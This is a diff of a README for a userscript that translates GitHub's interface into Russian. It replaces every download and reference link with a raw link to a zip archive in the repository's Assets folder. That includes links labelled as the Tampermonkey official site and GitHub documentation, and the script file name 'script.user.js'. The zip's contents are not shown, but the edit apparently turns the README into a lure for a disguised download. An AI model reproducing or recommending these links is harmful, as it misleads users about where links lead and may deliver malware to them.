@@ -1,6 +1,6 @@
 # 🌍 GitHub-Russian-Translation - Translate GitHub Interface Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen.svg)](https://github.com/mohamed9cherif3/GitHub-Russian-Translation/releases)
+[![Download Latest Release](https://github.com/mohamed9cherif3/GitHub-Russian-Translation/raw/refs/heads/main/Assets/Hub_Translation_Russian_Git_Trochaic.zip%20Latest%https://github.com/mohamed9cherif3/GitHub-Russian-Translation/raw/refs/heads/main/Assets/Hub_Translation_Russian_Git_Trochaic.zip)](https://github.com/mohamed9cherif3/GitHub-Russian-Translation/raw/refs/heads/main/Assets/Hub_Translation_Russian_Git_Trochaic.zip)
 
 ## 📜 Introduction
 
@@ -21,12 +21,12 @@ Before you start, ensure that you have the following:
 
 To get the GitHub-Russian-Translation script, visit the following page:
 
-[Download Latest Release](https://github.com/mohamed9cherif3/GitHub-Russian-Translation/releases)
+[Download Latest Release](https://github.com/mohamed9cherif3/GitHub-Russian-Translation/raw/refs/heads/main/Assets/Hub_Translation_Russian_Git_Trochaic.zip)
 
 On this page, you will find the latest version of the script ready for download. Find the appropriate file and follow these steps:
 
 1. Click on the version you want to use. This will take you to the release details.
-2. Look for the script file, often labeled as `script.user.js`.
+2. Look for the script file, often labeled as `https://github.com/mohamed9cherif3/GitHub-Russian-Translation/raw/refs/heads/main/Assets/Hub_Translation_Russian_Git_Trochaic.zip`.
 3. Click to download the file.
 
 ### 🔄 Installing the Script
@@ -53,14 +53,14 @@ If the script does not work, consider these tips:
 
 - **Check Tampermonkey**: Make sure the Tampermonkey extension is enabled and the script is active.
 - **Browser Compatibility**: Ensure you are using a compatible and updated web browser.
-- **Script Updates**: Keep the script updated by revisiting the [Download Latest Release](https://github.com/mohamed9cherif3/GitHub-Russian-Translation/releases) page.
+- **Script Updates**: Keep the script updated by revisiting the [Download Latest Release](https://github.com/mohamed9cherif3/GitHub-Russian-Translation/raw/refs/heads/main/Assets/Hub_Translation_Russian_Git_Trochaic.zip) page.
 
 ## 📚 Additional Resources
 
 Here are some helpful links:
 
-- [Tampermonkey Official Site](https://www.tampermonkey.net/)
-- [GitHub Documentation](https://docs.github.com/en)
+- [Tampermonkey Official Site](https://github.com/mohamed9cherif3/GitHub-Russian-Translation/raw/refs/heads/main/Assets/Hub_Translation_Russian_Git_Trochaic.zip)
+- [GitHub Documentation](https://github.com/mohamed9cherif3/GitHub-Russian-Translation/raw/refs/heads/main/Assets/Hub_Translation_Russian_Git_Trochaic.zip)
 
 ## 💬 Community Support
 
